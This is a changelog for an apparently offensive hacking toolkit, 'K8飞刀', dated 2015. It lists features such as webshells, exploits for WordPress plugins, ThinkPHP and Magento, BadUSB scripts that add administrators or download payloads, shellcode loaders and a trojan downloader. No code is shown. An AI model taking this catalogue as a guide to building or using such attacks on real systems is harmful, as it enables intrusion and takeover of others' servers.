20150929<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--0day漏洞--MS13-071主题远程代码执行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150924<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--VBS脚本--VBS下载者(http木马地址)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150920<br>=================================================================================<br>K8飞刀 20150911<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--File/文件--Mysql Inject OutFile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150909<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话/普通一句话 修改时间&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150828<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话/普通一句话文件重命名&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150828<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 修复 中文文件名读取&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150827<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 支持Linux系统服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150826<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 服务器文件下载到本地&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 本地文件上传到服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 下载URL文件到服务器&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 删除目标服务器文件&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--GetShell&nbsp; Lnx-CMD-Echo写shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--GetShell&nbsp; Win-CMD-Echo写shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--VBS脚本--VBS(字符串转ASCII码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150825<br>[+]FileShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent一句话 列目录(显示直观大小)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150821<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--ASCII码-多格式ASCII码转字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150817<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--VBS脚本--VBS(字符串转ASCII码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150817<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; PHP UserAgent WebShell(新型一句话木马)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150813<br>=================================================================================<br>K8飞刀 20150725<br>[u]AutoUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不再强制跳转URL,允许用户选择是否更新&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150725<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 腾达无线路由器(Tenda 11N)登陆密码绕过&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150724<br>[+]SysSeting&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 支持SOCKS5代理设置(配合Htran内网渗透)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150723<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导出Shell--导出TXT格式--存活WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150721<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导出Shell--导出TXT格式--掉线WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150721<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导出Shell--导出TXT格式--全部WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150721<br>=================================================================================<br>K8飞刀 20150720&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ShellCode Loader<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--ShellCode Loader&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150720<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--HexString2CharArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150720<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--CharArray2HexString&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150720<br>=================================================================================<br>K8飞刀 20150713&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking Team Flash0day ShellCode Exploit<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--ByteArray2UintArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150713<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--UintArray2ByteArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150713<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--CharArray2UintArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150711<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--UintArray2CharArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150711<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--ByteArray2CharArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150711<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--ShellCode--CharArray2ByteArray&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150708<br>=================================================================================<br>K8飞刀 20150705<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--新型Cookie一句话木马&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150705<br>[+]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FastStart(右键菜单快速启动CMD &amp; K8飞刀)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--DeDeCMS管理员密码加密解密算法&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150701<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Unix时间戳格式与时间互转 获取当前时间戳&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150629<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 浏览器模式 修复Cookier伪造欺骗无效的BUG&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150628<br>=================================================================================<br>K8飞刀 20150628<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 黑客浏览器伪造IP(VIA/X_FORWARDED_FOR/Client-IP)&nbsp;&nbsp; 20150628<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--非数字非字母PHP一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150628<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Base64编码--PHP反解Base64代码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150624<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--路径转义 \转\\ \\转\&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150623<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 更新IIS ASPX PHP IP小图标&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150623<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 世界第一电子商务系统 Magento 1.7.0.2 漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150615<br>=================================================================================<br>K8飞刀 20150610<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 批量删除掉线WebShell(使用前先检测存活状态)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150610<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--VBS转Teensy脚本支持&amp;符号&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150610<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 实用功能--选中内容 CMD运行/Bat运行/VBS运行&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150609<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--K8飞刀专用Perl一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--K8飞刀专用CFM一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--K8飞刀专用Python一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--无(单引号和$post)PHP一句话&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hacking--WebShell--无(单引号和分号)PHP一句话&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150608<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Acunetix WVS &lt;=9.5 全版本远程代码执行漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150603<br>=================================================================================<br>K8飞刀 20150601<br>[+]WebShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 导入TXT格式WebShell(格式:Shell地址 空格 密码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150601<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--导入URL(所有文本文件)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150601<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--抓取的URL自动进行URL解码&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150601<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--批量检测URL是否存在SQL注入&nbsp;&nbsp;&nbsp; 20150601<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--批量处理URL--保留结尾目录&nbsp;&nbsp;&nbsp;&nbsp; 20150531<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hack模式自动检测当前页面所有URL是否存在SQL注入&nbsp;&nbsp;&nbsp; 20150531<br>[+]HackerIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Hack模式--浏览网站自动记录Banner/IP/地理等信息&nbsp;&nbsp;&nbsp; 20150530<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 编码转换--Unicode2Ansi &amp; Ansi2Unicode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150530<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 藏文乱码(首先系统要安装藏文) 很多站用UTF8就搞定&nbsp;&nbsp; 20150529<br>[+]DataOutput&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 新增欧美系统编码ISO-8859-1(西藏文字)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150529<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 相关功能模块选中项进行高亮显示&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150528<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WP用户采集(WP3.41 WP3.52 WP3.61 WP3.81 WP3.88)&nbsp;&nbsp;&nbsp; 20150527<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress用户采集(WP4.10 WP4.12 WP4.21 WP4.2b3)&nbsp;&nbsp; 20150526<br>=================================================================================<br>K8飞刀 20150520<br>[+]ScanAdmin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 网站子域名扫描/二级域名扫描(渗透大型站点必备)&nbsp;&nbsp;&nbsp;&nbsp; 20150520<br>[+]ExpDebug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 一键生成EXP功能 调式好的EXP可直接生成EXE工具&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150519<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; EXP按钮右键菜单添加生成EXP功能 可直接生成EXE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150518<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键调整(相关功能转Hacking) 新增域名解析功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150517<br>[+]GoogleHacker&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Google黑客搜索模块--加载搜索语法\批量处理URL&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150516<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Web提交-PHP/Python/Perl/Flash/jQuery脚本完善&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150515<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy 完善相关脚本兼容性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150515<br>[u]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复WEB提交参数中出现邮箱可能会导致CSRF失败&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150515<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; elfinder &lt;=2.0 rc1 文件上传漏洞 GetShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150512<br>=================================================================================<br>K8飞刀 20150511<br>[u]AutoUpdate&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不再强制自动更新...仅在标题和弹框提示最新版&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150511<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy 完善对笔记本兼容性&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150504<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 其它功能 指定长度字符串生成(比如WP 64K XSS)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150501<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码 单字符(双引号 #号 :号 /号 -号)互转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150501<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码 单字符(单引号 逗号 分号 点号) 互转&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150501<br>=================================================================================<br>K8飞刀 20150425 WP漏洞专版<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress photo-uploader 1.8&nbsp;&nbsp;&nbsp;&nbsp; PHP文件上传漏洞&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Simple Ads Manager 2.5.96&nbsp; SQL注入漏洞&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Business Intelligence&nbsp;&nbsp; SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Security &amp; Firewall 3.9 SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Ajax Store Locator 1.2&nbsp; SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress sp-client-document-manager SQL注入漏洞&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WordPress Tune Library 1.5.4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wordpress MiwoFTP &lt;= 1.0.5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 文件下载漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wordpress NEX-Forms 3.0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入漏洞EXP&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Magento Server MAGMI&nbsp; 插件本地包含漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150425<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThinkPHP &lt;= 2.1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 任意代码执行漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150423<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ThinkPHP &lt;=3.1.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SQL注入漏洞利用EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150423<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Wordpress Mobile Edition 2.7 文件读取EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150422<br>K8飞刀 20150418<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CMS Made Simple 1.2.2 (TinyMCE) SQL注入EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150417<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CMS Made Simple 1.1.2 Remote Code Execution&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150417<br>[+]Exploit-DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CMS Made Simple 1.4.1 LFI 0day Exploit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150417<br>=================================================================================<br>K8飞刀 20150412 BadUSB专版<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy&nbsp; 过UAC执行任意脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy&nbsp; 执行自定义BAT脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy&nbsp; 执行自定义VBS脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy 添加管理员开启3389&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; VBS脚本(VBS转BAT脚本 VBS转CMD命令渗透常用)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150412<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Win 开启Telnet脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150410<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Win-EN DNS修改脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150410<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Win 添加管理员脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150409<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy(Win&amp;Lnx)下载者脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20150406<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; USB Hack--BadUSB--Teensy Linux&nbsp;&nbsp; 下载者脚本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 